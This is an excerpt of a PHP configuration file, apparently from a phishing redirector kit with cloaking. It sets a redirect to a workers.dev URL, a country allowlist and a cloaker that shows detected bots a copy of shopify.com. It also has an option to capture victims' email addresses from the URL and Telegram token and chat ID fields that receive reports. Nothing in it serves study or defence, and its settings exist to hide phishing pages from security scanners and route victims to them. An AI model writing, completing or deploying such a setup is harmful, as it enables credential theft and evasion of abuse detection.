...
$license_key = "g0829iinivt4vfvu4dslhnzj6pmvg03e"; // [ REQUIRED ]

$redirect = "https://d09b3c3a.8eed6a5dedffa5003bbfa95e.workers.dev"; // URL or FILE [ REQUIRED ]
...
$_COUNTRY_ALLOWED = ["ma","fr", "mx", "uk", "za", "ng", "tr", "at", "be", "bg", "hr", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [ REQUIRED ]

$redirection_link_check = false; // Check Your Page If Still Uploaded [ NOT REQUIRED ]

$check_red_page = false; // Check The Redirect If Red Flag  [ NOT REQUIRED ]

$authentification = false; //  [ NOT REQUIRED ]

$cloaker = [
    "url_to_grab" => "https://www.shopify.com/", // Change the link you want to grap it in your link ( if the visitor detected as bot )
];

$auto_grabber = false; // Activate Auto Grab Email (?email=)

$location_bots = "https://google.com"; // Send The Bots To This Link ( If Cloaker Url Empty )

$view_file_name = "views.php"; // .php Extension Required

$token_chat = "TOKEN"; // Your Token To Receive Rapports [ NOT REQUIRED ]

$chatid = "CHAT ID"; // Your ChatID To Receive Rapports [ NOT REQUIRED ]


$captcha = true; // Allow ZeroBot Captcha
